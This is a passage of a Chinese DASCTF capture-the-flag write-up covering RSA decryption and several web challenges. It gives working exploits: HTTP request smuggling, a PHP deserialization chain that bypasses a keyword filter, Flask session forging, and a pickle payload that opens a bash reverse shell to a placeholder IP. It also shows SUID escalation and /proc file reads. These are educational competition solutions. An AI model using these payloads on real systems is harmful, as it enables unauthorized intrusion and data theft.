class="comment"># e</span></span><br><span class="line"></span><br><span class="line">028181 <span class="comment"># d：长度=0x81</span></span><br><span class="line">00974ebb2da0bb0afb3603970c3e17d8b044af22070a3750b05b849ddeef1d4a986182eed3832cc8bafc316eea36835042e96c0a85a23abc637e72c7f0ea787df06127fe9dc3d21b8dae8018bdffc345107d5271ddb6d5fbc01f8cbf73f44410d61e006208356f1c5b85515efc708b34b676e78f18d4d3b68f5765d10b701f0361 <span class="comment"># d</span></span><br><span class="line"></span><br><span class="line">0241 <span class="comment"># p：长度=0x41</span></span><br><span class="line">00ea59434f560de2eaf4f21c22fb10691b79485e6290007dc28242bc63739fb95fa03e5ed807000d491f0ca43e50a91d43a6940f390c91757a3ba8226ce58112c9 <span class="comment"># p</span></span><br><span class="line"></span><br><span class="line">0241 <span class="comment"># q：长度=0x41</span></span><br><span class="line">00cad4c29d017e30ddabd606805044d9ca3e6a3184fb4e1f332845555498c36b02e7b97e2eb09d85c919e30a493ce94ef9412261c3998c7344271b6e6e1b3dfefb <span class="comment"># q</span></span><br></pre></td></tr></table></figure><p>解RSA：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="number">91817924748361493215143897386603397612753451291462468066632608541316135642691873237492166541761504834463859351830616117238028454453831120079998631107520871612398404926417683282285787231775479511469825932022611941912754602165499500350038397852503264709127650106856760043956604644700201911063515109074933378818</span></span><br><span class="line">p = <span class="number">0x00ea59434f560de2eaf4f21c22fb10691b79485e6290007dc28242bc63739fb95fa03e5ed807000d491f0ca43e50a91d43a6940f390c91757a3ba8226ce58112c9</span></span><br><span class="line">q = <span class="number">0x00cad4c29d017e30ddabd606805044d9ca3e6a3184fb4e1f332845555498c36b02e7b97e2eb09d85c919e30a493ce94ef9412261c3998c7344271b6e6e1b3dfefb</span></span><br><span class="line">n = <span class="number">0xb9ad332fb6b87d59b5b20b4ae880ba416d8724111f99a9ed498bcb365091d83dcc43fdff9b607df8a443bcadc79907c921e76b38003b5b0ece660437803195ebfab9a7e23fc0751228fdeefe5591827523d7b79ad04d85e4db5caa13f28a7e0124357d0685e00f14ccbb9679979923c2531ff487f9ba2500ade48995c315d913</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"><span class="built_in">print</span>(is_prime(p))</span><br><span class="line"><span class="built_in">print</span>(is_prime(q))</span><br><span class="line"></span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = <span class="number">0x974ebb2da0bb0afb3603970c3e17d8b044af22070a3750b05b849ddeef1d4a986182eed3832cc8bafc316eea36835042e96c0a85a23abc637e72c7f0ea787df06127fe9dc3d21b8dae8018bdffc345107d5271ddb6d5fbc01f8cbf73f44410d61e006208356f1c5b85515efc708b34b676e78f18d4d3b68f5765d10b701f0361</span></span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">x = <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])</span><br><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;DASCTF&#123;0e287wQ\x08R\x17\x00FGXYFZ\x07V\x03kIUCn\x02VDg\x01f\x0cN&#x27;</span></span><br></pre></td></tr></table></figure><p>结合压缩包注释，将结果与压缩包密码<code>C0ngr4tulati0n5_y0u_fou^d_m3</code> 高位补 <code>\x00</code>，</p><p>右对齐异或得flag：<code>DASCTF&#123;0e2874af5e422482378640e61d919e9a&#125;</code>。</p><p>​    </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="D0n’t-pl4y-g4m3-FIX"><a href="#D0n’t-pl4y-g4m3-FIX" class="headerlink" title="D0n’t pl4y g4m3!!! -FIX"></a>D0n’t pl4y g4m3!!! -FIX</h3><blockquote><p>小明不小心沉迷⚪⚪的东西把源码和猫猫搞丢了，请帮他找回来。请访问/p0p.php</p></blockquote><p>bp访问 <code>/p0p.php</code>，提示：<code># ./有hint.zip</code>，</p><p>访问 <code>hint.zip</code> ，<a href="https://zdjd.vercel.app/">在线尊嘟假嘟解码</a>，得 <code>flag在/tmp/catcatf1ag.txt</code>。</p><p>查看首页发现使用了PHP Development Server，当PHP&lt;=7.4.21时Development Server存在源码泄露漏洞（CNVD-2023-05738），该漏洞源于php cli server begin send static在解析http请求时存在逻辑漏洞，攻击者可利用该漏洞将两个请求拼接至一个http请求中导致服务器将php文件作为静态文件返回。</p><p>构造请求走私：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/p0p.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>tcp.cloud.dasctf.com:20294</span><br><span class="line"></span><br><span class="line"><span class="language-http"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span></span><br><span class="line"><span class="language-http"></span></span><br></pre></td></tr></table></figure><p>拿到 <code>p0p.php</code> 的源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;HTTP/1.1 302 found&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:https://passer-by.com/pacman/&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pro</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$exp</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$rce2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$rce2</span>=<span class="variable language_">$this</span>-&gt;exp[<span class="variable">$rce2</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">call_user_func</span>(<span class="string">&#x27;system&#x27;</span>, <span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yang</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$ary</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;key === <span class="literal">true</span> || <span class="variable language_">$this</span>-&gt;finish1-&gt;name) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;finish-&gt;finish) &#123;</span><br><span class="line">                <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;now[<span class="variable">$name</span>], <span class="variable">$ary</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ycb</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;now = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;finish-&gt;finish;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = True;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cheng</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$finish</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;name[<span class="variable">$value</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bei</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;CTF-&gt;<span class="title function_ invoke__">ycb</span>()) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;fine-&gt;<span class="title function_ invoke__">YCB1</span>(<span class="variable">$this</span>-&gt;rce, <span class="variable">$this</span>-&gt;rce1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">prohib</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&quot;/system|exec|passthru|shell_exec|popen|proc_open|pcntl_exec|eval|flag/i&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">&quot;CTF&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$a</span>))&#123;</span><br><span class="line">  <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">prohib</span>(<span class="variable">$a</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># ./有hint.zip</span></span><br></pre></td></tr></table></figure><p>分析构造反序列化链，由 <code>Bei:__destruct()</code> 开始，调用到 <code>Yang:__call()</code> 中的 <code>call_user_func()</code> 函数RCE：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> serialize</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Yang</span>:</span><br><span class="line">    public_finish=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Yang</span>:</span><br><span class="line">    public_finish=Yang()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Yang</span>:</span><br><span class="line">    public_finish=Yang()</span><br><span class="line">    public_now=&#123;<span class="string">&#x27;YCB1&#x27;</span>:<span class="string">&#x27;system&#x27;</span>&#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Bei</span>:</span><br><span class="line">    public_CTF=Yang()</span><br><span class="line">    public_fine=Yang()</span><br><span class="line">    public_rce=<span class="string">&#x27;cat /tmp/catcatf1ag.txt&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(serialize(Bei()))</span><br><span class="line"></span><br><span class="line"><span class="comment"># O:3:&quot;Bei&quot;:3:&#123;s:3:&quot;CTF&quot;;O:4:&quot;Yang&quot;:2:&#123;s:6:&quot;finish&quot;;O:4:&quot;Yang&quot;:1:&#123;s:6:&quot;finish&quot;;O:4:&quot;Yang&quot;:1:&#123;s:6:&quot;finish&quot;;i:1;&#125;&#125;s:3:&quot;now&quot;;a:1:&#123;s:4:&quot;YCB1&quot;;s:6:&quot;system&quot;;&#125;&#125;s:4:&quot;fine&quot;;O:4:&quot;Yang&quot;:2:&#123;s:6:&quot;finish&quot;;r:3;s:3:&quot;now&quot;;a:1:&#123;s:4:&quot;YCB1&quot;;s:6:&quot;system&quot;;&#125;&#125;s:3:&quot;rce&quot;;s:23:&quot;cat /tmp/catcatf1ag.txt&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>双写system绕过关键词过滤，POST传参：</p><p><code>CTF=O:3:&quot;Bei&quot;:3:&#123;s:3:&quot;CTF&quot;;O:4:&quot;Yang&quot;:2:&#123;s:6:&quot;finish&quot;;O:4:&quot;Yang&quot;:1:&#123;s:6:&quot;finish&quot;;O:4:&quot;Yang&quot;:1:&#123;s:6:&quot;finish&quot;;i:1;&#125;&#125;s:3:&quot;now&quot;;a:1:&#123;s:4:&quot;YCB1&quot;;s:6:&quot;systsystemem&quot;;&#125;&#125;s:4:&quot;fine&quot;;O:4:&quot;Yang&quot;:2:&#123;s:6:&quot;finish&quot;;r:3;s:3:&quot;now&quot;;a:1:&#123;s:4:&quot;YCB1&quot;;s:6:&quot;systsystemem&quot;;&#125;&#125;s:3:&quot;rce&quot;;s:23:&quot;cat /tmp/catcatf1ag.txt&quot;;&#125;</code></p><p>得到flag：<code>DASCTF&#123;54675642781313253235583695043371&#125;</code>。</p><p>​    </p><h3 id="Serpent"><a href="#Serpent" class="headerlink" title="Serpent"></a>Serpent</h3><blockquote><p> I have been endeavoring to Reduce my phobia of Serpents by learning more about them. Do not scan, note that there is a www.zip file under the website.</p></blockquote><p>尝试解flask session：</p><p><code>flask-unsign --decode --cookie &#39;eyJBdHRyaWJ1dGUiOnsiYWRtaW4iOjAsIm5hbWUiOiJHV0hUIiwic2VjcmV0X2tleSI6IkdXSFR4Y3VMeGhWZVFBIn19.ZPLWRw.5YHps4KX1FfZNY5xe9-25Nckl7s&#39;</code></p><p>得：<code>&#123;&#39;Attribute&#39;: &#123;&#39;admin&#39;: 0, &#39;name&#39;: &#39;GWHT&#39;, &#39;secret_key&#39;: &#39;GWHTxcuLxhVeQA&#39;&#125;&#125;</code></p><p>包含secret_key，修改为：<code>&#123;&#39;Attribute&#39;: &#123;&#39;admin&#39;: 1, &#39;name&#39;: &#39;admin&#39;, &#39;secret_key&#39;: &#39;GWHTxcuLxhVeQA&#39;&#125;&#125;</code>，加密后改cookie：</p><p><code>flask-unsign --sign --cookie &quot;&#123;&#39;Attribute&#39;: &#123;&#39;admin&#39;: 1, &#39;name&#39;: &#39;admin&#39;, &#39;secret_key&#39;: &#39;GWHTxcuLxhVeQA&#39;&#125;&#125;&quot; --secret &#39;GWHTxcuLxhVeQA&#39;</code></p><p>得到提示：<code>Hello admin, welcome to /ppppppppppick1e</code>。</p><p>访问 <code>ppppppppppick1e</code> 路由，在Header发现：<code>Hint: Source in /src0de</code>，得到源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/src0de&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">src0de</span>():</span><br><span class="line">    f = <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    rsp = f.read()</span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">return</span> rsp[rsp.index(<span class="string">&quot;@app.route(&#x27;/src0de&#x27;)&quot;</span>):]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/ppppppppppick1e&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ppppppppppick1e</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        username = <span class="string">&quot;admin&quot;</span></span><br><span class="line">        rsp = make_response(<span class="string">&quot;Hello, %s &quot;</span> % username)</span><br><span class="line">        rsp.headers[<span class="string">&#x27;hint&#x27;</span>] = <span class="string">&quot;Source in /src0de&quot;</span></span><br><span class="line">        pick1e = request.cookies.get(<span class="string">&#x27;pick1e&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> pick1e <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            pick1e = base64.b64decode(pick1e)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> rsp</span><br><span class="line">        <span class="keyword">if</span> check(pick1e):</span><br><span class="line">            pick1e = pickle.loads(pick1e)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Go for it!!!&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;No Way!!!&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        error_message = <span class="built_in">str</span>(e)</span><br><span class="line">        <span class="keyword">return</span> error_message</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> rsp</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">GWHT</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>python反序列化，测试发现禁用R指令，参考<a href="https://zhuanlan.zhihu.com/p/89132768">这里</a>使用不带R指令的RCE payload：</p><p><code>b&#39;\x80\x03c__main__\nGWHT\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVbash -c &quot;bash -i &gt;&amp; /dev/tcp/[IP]/[Port] 0&gt;&amp;1&quot;\nb.&#39;</code></p><p>base64编码后给cookie中的 <code>pick1e</code> 赋值，成功反弹shell。</p><p>读根目录下flag发现无权限，查看SUID可执行文件：</p><p><code>find / -perm -u=s -type f 2&gt;/dev/null</code>，</p><p>发现 <code>/usr/bin/python3.8</code>，执行 <code>python3.8 -c &quot;print(open(&#39;/flag&#39;).read())&quot;</code> 读到flag：<code>DASCTF&#123;62339708167284198788958643730094&#125;</code>。</p><p>​    </p><h3 id="ArkNights"><a href="#ArkNights" class="headerlink" title="ArkNights"></a>ArkNights</h3><blockquote><p>Fantasy world full of magic and dream…………….</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> *</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] =<span class="built_in">str</span>(uuid.uuid4()).replace(<span class="string">&quot;-&quot;</span>,<span class="string">&quot;*&quot;</span>)+<span class="string">&quot;Boogipopisweak&quot;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name=request.args.get(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;name&quot;</span>)</span><br><span class="line">    m1sery=[request.args.get(<span class="string">&quot;m1sery&quot;</span>,<span class="string">&quot;Doctor.Boogipop&quot;</span>)]</span><br><span class="line">    <span class="keyword">if</span>(session.get(<span class="string">&quot;name&quot;</span>)==<span class="string">&quot;Dr.Boog1pop&quot;</span>):</span><br><span class="line">        blacklist=re.findall(<span class="string">&quot;/ba|sh|\\\\|\[|]|#|system|&#x27;|\&quot;/&quot;</span>, name, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> blacklist:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;bad hacker no way&quot;</span></span><br><span class="line">        <span class="built_in">exec</span>(<span class="string">f&#x27;for [<span class="subst">&#123;name&#125;</span>] in [<span class="subst">&#123;m1sery&#125;</span>]:print(&quot;strange?&quot;)&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        session[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&quot;Doctor&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>,name=session.get(<span class="string">&quot;name&quot;</span>))</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">        file = request.args.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">        fileblacklist=re.findall(<span class="string">&quot;/flag|fl|ag/&quot;</span>,file, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> fileblacklist:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;bad hacker!&quot;</span></span><br><span class="line">        start=request.args.get(<span class="string">&quot;start&quot;</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">        end=request.args.get(<span class="string">&quot;end&quot;</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> start==<span class="string">&quot;0&quot;</span> <span class="keyword">and</span> end==<span class="string">&quot;0&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">open</span>(file,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            start,end=<span class="built_in">int</span>(start),<span class="built_in">int</span>(end)</span><br><span class="line">            f=<span class="built_in">open</span>(file,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line">            f.seek(start)</span><br><span class="line">            data=f.read(end)</span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&lt;path:path&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_page</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="built_in">print</span>(os.path.pardir)</span><br><span class="line">    <span class="built_in">print</span>(path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&quot;templates/&quot;</span> + path):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;not found&quot;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">return</span> render_template(path)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="literal">False</span>,</span><br><span class="line">        host=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure></blockquote><p>非预期，利用 <code>read</code> 路由读环境变量文件 <code>/proc/1/environ</code> 文件找到flag：<code>/read?file=/proc/1/environ</code>。</p><p><code>DASFLAG=DASCTF&#123;67528847472042710457227886304140&#125;</code></p><p>预期解应该是分别通过 <code>/proc/self/maps</code> 和 <code>/proc/self/mem</code> 读取堆栈分布和对应位置内存数据拿到SECRET_KEY值，再修改flask session绕黑名单RCE。</p><p>​    </p><h3 id="ezyaml"><a href="#ezyaml" class="headerlink" title="ezyaml"></a>ezyaml</h3><blockquote><p>简单得yaml</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span 